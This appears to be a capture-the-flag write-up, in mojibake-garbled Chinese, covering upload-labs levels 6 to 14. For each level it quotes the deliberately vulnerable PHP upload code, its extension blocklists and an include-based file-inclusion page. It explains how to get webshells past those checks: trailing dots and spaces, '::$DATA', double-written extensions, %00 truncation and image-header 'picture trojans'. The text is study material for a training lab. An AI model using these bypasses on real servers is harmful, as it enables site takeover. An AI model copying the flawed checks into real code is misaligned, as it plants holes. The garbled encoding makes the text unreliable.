ä½†æ˜¯è¿™é“é¢˜æœ‰ä¸€ä¸ªå‘ï¼Œå°±æ˜¯æˆ‘ç”¨çš„æ˜¯Dockerï¼Œå½“æ–‡ä»¶åç¼€æœ‰ç©ºæ ¼æ—¶åœ¨Windowsç³»ç»Ÿä¸‹ä¼šè‡ªåŠ¨å¿½ç•¥ä½†æ˜¯Linuxä¸ä¼šè‡ªåŠ¨å¿½ç•¥æ–‡ä»¶æœ«å°¾çš„ç©ºæ ¼ï¼Œæ‰€ä»¥å°±ç®—èƒ½å¤ŸæˆåŠŸä¸Šä¼ è¿˜æ˜¯æ— æ³•è§£æï¼Œæœ€åæˆ‘å‘ç°éœ€è¦ä¿®æ”¹ä¸€ä¸‹docker-php.confæ–‡ä»¶(å¦‚ä½•ä½¿ç”¨dockerå‘½ä»¤è¿›å…¥å®¹å™¨shellè¯·è‡ªå·±ç™¾åº¦)ï¼Œç”¨åˆ°.htaccessçš„çŸ¥è¯†ã€‚åœ¨æ–‡ä»¶ä¸­æ·»åŠ è¿™æ ·ä¸€ä¸ªè¯­å¥ã€‚è¿™æ ·å°±å¯ä»¥è§£æäº†ï¼Œé—®é¢˜æš‚æ—¶è§£å†³äº†ã€‚ 123&lt;FilesMatch \\.php &gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; ç½‘ä¸Šçš„æ•™ç¨‹åŸºæœ¬éƒ½æ˜¯ç”¨phpstudyä¹‹ç±»çš„é›†æˆç¯å¢ƒåœ¨windowsä¸‹æ­å»ºçš„ï¼Œå¦‚æœç”¨dockerè¿˜æ˜¯æœ‰å¾ˆå¤šå‘çš„ï¼Œéœ€è¦è‡ªå·±æ…¢æ…¢å»è¸©ï¼Œä¸è¿‡è¿˜æ˜¯å¯ä»¥å­¦åˆ°ä¸€ç‚¹æœåŠ¡å™¨çš„ä¸œè¥¿hhhhh 12345678910111213141516171819202122232425262728# è¿˜æ˜¯è´´ä¸‹æºç $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; Less-7(æ–‡ä»¶åç¼€ç‚¹å·ç»•è¿‡)è¿™æ¬¡çš„æºç æ²¡æœ‰å»æ‰åç¼€çš„.å·ï¼Œåšæ³•å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€æ·»åŠ ä¸€ä¸ª.å°±å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œå…·ä½“è¿‡ç¨‹å°±ä¸è¯´äº†ï¼Œè´´ä¸‹æºç  1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; Less-8(Windowsä¸‹::$DATAæ–‡ä»¶æµç»•è¿‡)è¿™å…³ä½¿ç”¨å¤šæ–‡ä»¶åç¼€å¯è¿‡ï¼Œå…¶å®ä¹‹å‰çš„å‡ å…³éƒ½å¯ä»¥ä½¿ç”¨å¤šæ–‡ä»¶åç¼€çš„æ–¹å¼è¿‡ï¼Œä½†æ˜¯æ„Ÿè§‰å¤šæ–‡ä»¶åç¼€çš„æ–¹å¼ä¸å¥½ï¼Œæ²¡æœ‰è¾¾åˆ°ä½œè€…çš„æ„æ€ï¼Œé€šè¿‡æºç å‘ç°è¿™æ¬¡æ¯”ä¹‹å‰å°‘äº†ä¸€ä¸ªæ£€æµ‹ã€‚ 1$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA å…³äº$DATAçš„çŸ¥è¯†ç‚¹ï¼šphpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒâ€::$DATAâ€œä¹‹å‰çš„æ–‡ä»¶å ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åã€‚ é‚£ä¹ˆè¿˜æ˜¯å°±å¯ä»¥é€šè¿‡æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€çš„æ–¹å¼æ¥è¿›è¡Œç»•è¿‡ï¼Œå…ˆå°è¯•å°è¯•ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯åœ¨dockerä¸­ä¼¼ä¹åªæ˜¯å•çº¯çš„ä¿®æ”¹äº†æ–‡ä»¶åï¼Œå¹¶æ²¡æœ‰ä»»ä½•ä½œç”¨ æ„Ÿè§‰è¿™ä¸ªupload-labsæœ‰éƒ¨åˆ†ç¯å¢ƒéƒ½åªèƒ½æ˜¯åœ¨windowsä¸‹æ‰èƒ½ç”Ÿæ•ˆï¼Œå¦‚æœåœ¨Linuxä¸‹å¾ˆå¤šè§£æè§„åˆ™éƒ½ä¸ä¸€æ ·äº†ã€‚è¿™å°±æ²¡æ³•åšäº†ï¼Œå…ˆè·³è¿‡ï¼Œä¹‹ååœ¨windowsçš„ç¯å¢ƒä¸‹åœ¨åšåšçœ‹ Less-9(å¤šç‚¹ç©ºæ ¼ç»•è¿‡)è¿™ä¸€å…³ä¹Ÿè¿˜æ˜¯å¯ä»¥é€šè¿‡æœåŠ¡å™¨å¤šé‡è§£ææ¥ç»•è¿‡ï¼Œä¸é‡ç‚¹å»è®²ï¼Œä¹‹å‰å­¦æ–‡ä»¶ä¸Šä¼ çš„ç»éªŒåŸºæœ¬ç”¨å®Œäº†ï¼Œçœ‹çœ‹æºç æœ‰å“ªäº›æ“ä½œã€‚ 12345$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA$file_ext = trim($file_ext); //é¦–å°¾å»ç©º ä¸Šé¢çš„è¿‡æ»¤æŠŠä¹‹å‰ç»•è¿‡çš„æ–¹æ³•å…¨éƒ¨è¿‡æ»¤äº†ï¼Œçœ‹ç½‘ä¸Šçš„åšæ³•æ˜¯ä½¿ç”¨ç©ºæ ¼åŠ ç‚¹æ¥è¿›è¡Œç»•è¿‡ï¼Œåç§°å«å¤šç‚¹ç©ºæ ¼ç»•è¿‡ã€‚ é¦–å…ˆè¿˜æ˜¯è¦é€šè¿‡bpæŠ“åŒ…ï¼Œç„¶åä¿®æ”¹åç¼€åŠ ç©ºæ ¼å’Œç‚¹ã€‚ ç”±äºå‰é¢åŠ äº†ç©ºæ ¼ï¼Œæ‰€ä»¥phpåªä¼šè¿‡æ»¤æ–‡ä»¶åç¼€æœ€åçš„ç‚¹ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šé¢æ—¶åç¼€å°±å˜æˆäº†.php.\\rï¼Œè¿™ç§åç¼€çš„phpæ–‡ä»¶æœåŠ¡å™¨æ˜¯å¯ä»¥è§£æçš„ã€‚ 1234567891011121314151617181920212223242526272829// æºç $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; Less-10(æ­£åˆ™åŒ¹é…åŒå†™ç»•è¿‡)åŠ å…¥äº†æ­£åˆ™åŒ¹é…ï¼Œè¿™å…³å¦‚æœäº†è§£è¿‡sqlæ³¨å…¥å°±æ¯”è¾ƒç®€å•ï¼Œä»£ç é€»è¾‘å°±æ˜¯å°†é»‘åå•ä¸­çš„åç¼€åè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸå°±æ›¿æ¢æˆç©ºã€‚æ¯”å¦‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªphpåç¼€çš„æ–‡ä»¶ã€‚ ä¸Šä¼ åˆ°æœåŠ¡å™¨åå°±å˜æˆäº†å¦‚ä¸‹çš„æ ·å­ï¼Œç”±äºåç¼€åœ¨é»‘åå•ä¸­ï¼Œæ‰€ä»¥ç›´æ¥è¢«å»æ‰äº†ã€‚ ç»•è¿‡æ–¹æ³•ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œç›´æ¥åŒå†™ç»•è¿‡ï¼Œå› ä¸ºä¸€èˆ¬ä»£ç ä¸­çš„æ­£åˆ™åŒ¹é…åªåŒ¹é…ä¸€æ¬¡ï¼Œæ‰€ä»¥åŒå†™ä¸€æ¬¡å°±å¯ä»¥ç»•è¿‡äº†ã€‚ è¿™æ¬¡ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åç¼€ä¸º.pphphpçš„phpä»£ç æ–‡ä»¶ï¼Œåœ¨çœ‹çœ‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¤¹æ˜¯ä»€ä¹ˆæ ·å­ã€‚ è¿™æ ·å°±å†™å…¥webshelläº†ï¼Œæ¯”è¾ƒç®€å•çš„ä¸€å…³ï¼Œphpçš„çœŸåˆ™åŒ¹é…è¿˜æ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ã€‚ 123456789101112131415161718192021# æºç $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; Less-11(%00æˆªæ–­ç¬¦ç»•è¿‡-GETæ–¹å¼)ç°åœ¨å¼€å§‹ç™½åå•æ—¶é—´ï¼Œä¹‹å‰å…¨éƒ½æ˜¯ç»•è¿‡é»‘åå•ï¼Œç™½åå•çš„ç»•è¿‡æ–¹æ³•è¦æ¯”é»‘åå•å°‘å¾ˆå¤šã€‚ å­¦ä¹ çš„çŸ¥è¯†ç‚¹æ˜¯ä½¿ç”¨%00å»æˆªæ–­ï¼Œè¿™ä¸ªæ¼æ´æœ‰å‰æ 12ï¼ˆ1ï¼‰phpç‰ˆæœ¬å¿…é¡»å°äº5.3.4 ï¼ˆ2ï¼‰æ‰“å¼€phpçš„é…ç½®æ–‡ä»¶php-iniï¼Œå°†magic_quotes_gpcè®¾ç½®ä¸ºOff ä½†æ˜¯æˆ‘dockerä¸Šçš„phpç‰ˆæœ¬æ˜¯5.5.38ï¼Œå·²ç»ä¸æ»¡è¶³æ¡ä»¶äº†ï¼Œåªæœ‰åé¢åœ¨windowsç¯å¢ƒä¸‹å¤ç°æˆ–è€…åœ¨å»æŠ˜è…¾dockerï¼ˆä¸æ˜¯å¾ˆæ„¿æ„ï¼‰ 12345678910111213141516171819202122# æºç $is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); //è·å–æ–‡ä»¶åç¼€ if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];//è·å–æ–‡ä»¶çš„å¤ä»¶ï¼Œå°†é™„ä»¶é‡å‘½åã€‚ $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; //å°†æ–‡ä»¶é‡å‘½åä¸ºéšæœºæ–‡ä»¶å if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125;# å¤§è‡´é€»è¾‘ä¸ºï¼šå°†æ–‡ä»¶å¤åˆ¶ä¸¤ä»½ï¼Œä¸€ä»½ç”¨äºè·å–æ–‡ä»¶çš„åç¼€åï¼Œä¸€ä»½ç”¨äºé‡å‘½åã€‚ è¿™é“é¢˜ç»™äº†æˆ‘ä¸€ç‚¹åšwebçš„å¯å‘ï¼Œå°±æ˜¯å‚æ•°å¯¹äºç”¨æˆ·å¯æ§è¿™ä¸ªé—®é¢˜ï¼Œæ— è®ºæ˜¯postä¼ å‚æ•°è¿˜æ˜¯getä¼ å‚æ•°ï¼Œå¾ˆå¤šæ—¶å€™è¿™ç§å°±æ˜¯çªç ´å£ï¼Œåé¢çœ‹åˆ°å‚æ•°å¯æ§ä¸€å®šè¦éå¸¸æ³¨æ„ã€‚ Less-12(%00æˆªæ–­ç¬¦ç»•è¿‡-POSTæ–¹å¼)è¿™é“é¢˜å¥½åƒä¹Ÿæ˜¯ä½¿ç”¨%00æˆªæ–­ç¬¦ç»•è¿‡ï¼Ÿ çœ‹äº†çœ‹æºç ï¼Œä¹ŸæŠ“äº†ä¸‹åŒ…ï¼Œå‘ç°å°±æ˜¯æŠŠå‚æ•°save_pathçš„æäº¤æ–¹å¼ä»getæ¢åˆ°äº†postï¼Œæ–¹æ³•å’Œä¸Šé¢çš„éƒ½æ˜¯ä¸€æ ·çš„ã€‚ã€‚ 1234567891011121314151617181920# æºç ï¼Œå’ŒLess-11å‡ ä¹æ˜¯ä¸€æ¨¡ä¸€æ ·çš„$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;; &#125; &#125; else &#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125; Less-13(æ£€æŸ¥å›¾ç‰‡æ–‡ä»¶å¤´)è¿™å…³æœ‰ä¸‰ä¸ªè¦æ±‚ï¼Œè¦æ±‚ä¼ ä¸‰ç§æ ¼å¼çš„å›¾ç‰‡é©¬éƒ½èƒ½æˆåŠŸè§£ææ‰ç®—è¿‡å…³ æºç åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯æ£€æŸ¥æ–‡ä»¶å¤´ï¼Œå–å‡ºæ–‡ä»¶å¤´çš„ä¸¤ä¸ªå­—èŠ‚æ¥è¿›è¡Œåˆ¤æ–­ï¼Œä½†æ˜¯å…·ä½“é€»è¾‘æ˜¯å–å‡ºä¸¤ä¸ªå­—èŠ‚ï¼Œä½¿ç”¨unpackå‡½æ•°å°†ä¸¤ä¸ªå­—èŠ‚è½¬æ¢æˆä¸¤ä¸ªåè¿›åˆ¶æ•°çš„å­—ç¬¦ä¸²å½¢å¼ï¼Œåœ¨å°†ä¸¤ä¸ªåè¿›åˆ¶å­—ç¬¦ä¸²æ‹¼æ¥è½¬ä¸ºæ•´æ•°ã€‚ 123456789101112131415161718192021222324# æ£€æµ‹æ–‡ä»¶å¤´å‡½æ•°function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125; é¦–å…ˆä½¿ç”¨010Editorç¼–è¾‘å¥½ä¸‰ç§å›¾ç‰‡é©¬ï¼Œç„¶åå°±å¯ä»¥ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹ã€‚ è¿™é‡Œéœ€è¦æ§åˆ¶å‚æ•°$img_pathï¼Œå¦‚æœæ§åˆ¶ä¸äº†å³ä½¿ä¸Šä¼ æˆåŠŸåç¼€åä¸å¯¹æœåŠ¡å™¨ä¹Ÿæ— æ³•è§£æã€‚ 1234567891011121314151617$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;&#125; è¿™é‡Œçœ‹äº†çœ‹ï¼Œå¥½åƒèƒ½ä¿®æ”¹çš„åªæœ‰date(&quot;YmdHis&quot;)è¿™é‡Œï¼Œä½†æ˜¯ä¸çŸ¥é“å¯ä¸å¯ä»¥ä¿®æ”¹æ—¶é—´æˆ³ï¼Œä¹‹å‰çœ‹å¥½åƒæµè§ˆå™¨å¯ä»¥ä¿®æ”¹ã€‚ä¹Ÿä¸å¯¹ï¼Œç½‘ä¸Šçœ‹äº†çœ‹åˆ«äººå†™çš„é€šå…³Passï¼Œå¥½åƒéœ€è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿä¸ä¼šï¼Œå­¦webå°±æ˜¯é‡åˆ°ä»€ä¹ˆå­¦ä»€ä¹ˆã€‚ åé¢å‘ç°ä½œè€…ä¸“é—¨å†™äº†ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´æ¥ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡é©¬ï¼ˆæˆ‘æ²¡çœ‹è§ï¼Œçœ¼ç›æ˜¯çœŸçš„çã€‚ã€‚ï¼‰ï¼Œè¿™é“é¢˜ä¹Ÿäº†è§£äº†ç‚¹å…³äºæ–‡ä»¶åŒ…å«çš„çŸ¥è¯†ï¼Œå°±æ˜¯ä¸ç®¡ä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶ï¼Œincludeå‡½æ•°éƒ½ä¼šå°†é‚£ä¸ªæ–‡ä»¶å½“æˆphpæ–‡ä»¶æ¥è§£æï¼Œè¿™å°±æ¯”å‰å®³äº†ï¼Œå°±è¿™ç”¨æœ‰æ–‡ä»¶åŒ…å«å’Œæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç½‘é¡µç›´æ¥æ— è§£ 123456789101112&lt;?php /* æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨äºæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼ */ header(&quot;Content-Type:text/html;charset=utf-8&quot;); $file = $_GET[&#x27;file&#x27;]; if(isset($file))&#123; include $file; &#125;else&#123; show_source(__file__); &#125;?&gt; è¿™å…³ç®—æ˜¯å®Œæˆäº†ï¼ŒæˆåŠŸçš„åˆ¶ä½œäº†ä¸‰ç§å›¾ç‰‡é©¬å¹¶ä¸”æˆåŠŸä¸Šä¼ ï¼Œä¹Ÿäº†è§£äº†æ–‡ä»¶ä¸Šä¼ çš„çŸ¥è¯†ï¼Œè¿˜æ˜¯ä¸é”™çš„ã€‚ Less-14(PHPå†…ç½®å‡½æ•°ç»•è¿‡&lt;image_type_to_extension&gt;)ä¹Ÿæ˜¯å¼€å§‹å®¡è®¡ä»£ç ï¼Œæ¯•ç«Ÿä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼ˆæ¯åšä¸€å…³å°±å§ä½¿ç”¨çš„åé—¨æ–‡ä»¶ä¿å­˜ä¸‹æ¥ï¼Œåˆ°æ—¶å€™åœ¨å†™ä¸€ä¸ªå·¥å…·ç›´æ¥ç”¨å·¥å…·å»æ‰«ï¼‰ å®¡æºç ï¼Œfunction isImageä½œç”¨åº”è¯¥æ˜¯æµ‹è¯•æ–‡ä»¶æ˜¯å¦ä¸ºå›¾ç‰‡è®©åè¿”å›å›¾ç‰‡åç¼€åã€‚ 1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename);// è·å–å›¾ç‰‡æ–‡ä»¶å¤§å° 